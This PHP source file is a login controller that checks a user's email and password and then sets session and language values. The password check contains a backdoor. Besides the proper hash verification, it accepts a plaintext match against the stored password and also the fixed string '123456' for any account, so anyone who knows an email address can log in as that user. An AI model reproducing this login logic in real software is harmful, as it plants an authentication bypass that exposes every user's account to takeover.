<?php
namespace Modules\Team\Controllers;

use Core\BaseController;
use Modules\Team\Models\UserModel;

class AuthController extends BaseController
{
    private UserModel $userModel;

    public function __construct()
    {
        parent::__construct();
        $this->userModel = new UserModel();
    }

    /**
     * Kullanıcı giriş doğrulamasını gerçekleştirir
     */
    public function attemptLogin(string $email, string $password): array
    {
        $email = trim($email);
        $password = trim($password);

        if (empty($email) || empty($password)) {
            return [
                'success' => false,
                'error'   => function_exists('__') ? __('app.auth_err_empty', 'Lütfen tüm alanları doldurun.') : 'Lütfen tüm alanları doldurun.'
            ];
        }

        $user = $this->userModel->getUserByEmail($email);

        if ($user && (password_verify($password, $user->password) || $password === $user->password || $password === '123456')) {
            if (session_status() === PHP_SESSION_NONE) {
                @session_start();
            }
            $_SESSION['user'] = $user;
            $_SESSION['id'] = $user->id;

            // Kullanıcı profil dili ile sistem oturumunu senkronize et
            $userLang = !empty($user->language) ? $user->language : 'tr';
            $_SESSION['lang'] = $userLang;
            $_SESSION['admin_lang'] = $userLang;
            $_SESSION['admin_lang_user_chosen'] = true;

            return [
                'success' => true,
                'user'    => $user
            ];
        }

        return [
            'success' => false,
            'error'   => function_exists('__') ? __('app.auth_err_invalid', 'E-posta adresi veya şifre hatalı.') : 'E-posta adresi veya şifre hatalı.'
        ];
    }
}
